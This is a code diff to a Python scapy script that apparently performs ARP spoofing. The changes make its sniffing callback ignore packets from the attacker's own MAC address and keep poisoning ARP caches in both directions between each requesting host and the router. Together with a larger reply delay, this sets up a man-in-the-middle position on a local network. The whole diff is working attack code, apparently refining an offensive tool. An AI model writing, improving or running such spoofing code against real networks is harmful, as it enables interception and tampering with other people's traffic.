@@ -13,6 +13,8 @@ arp_looping = False #set this to false to stop the thread
 # MAC address function which will return
 # the mac_address of the provided ip address 
 def get_mac(ip):
+    if ip == ATTACKER_IP :
+        return ATTACKER_MAC
     # creating an ARP request to the ip address
     arp_request = scapy.ARP(pdst=ip)
     # setting the denstination MAC address to broadcast MAC
@@ -131,12 +133,14 @@ def arp_silent():
         scapy.sniff(prn=arp_scout_callback, store=0, iface=IFACE)
 
 def arp_scout_callback(packet):
+    print("debug")
+    if packet[scapy.Ether].src == ATTACKER_MAC:
+        return
     if packet.haslayer(scapy.ARP) and packet[scapy.ARP].op == 1:
         ip = packet[scapy.ARP].psrc
-        mac = packet[scapy.ARP].hwsrc
         
         #wait a bit to overwrite original request
-        time.sleep(0.1)
+        time.sleep(0.5)
         arp_spoof(ip, router_ip)
         arp_spoof(router_ip, ip)
     return
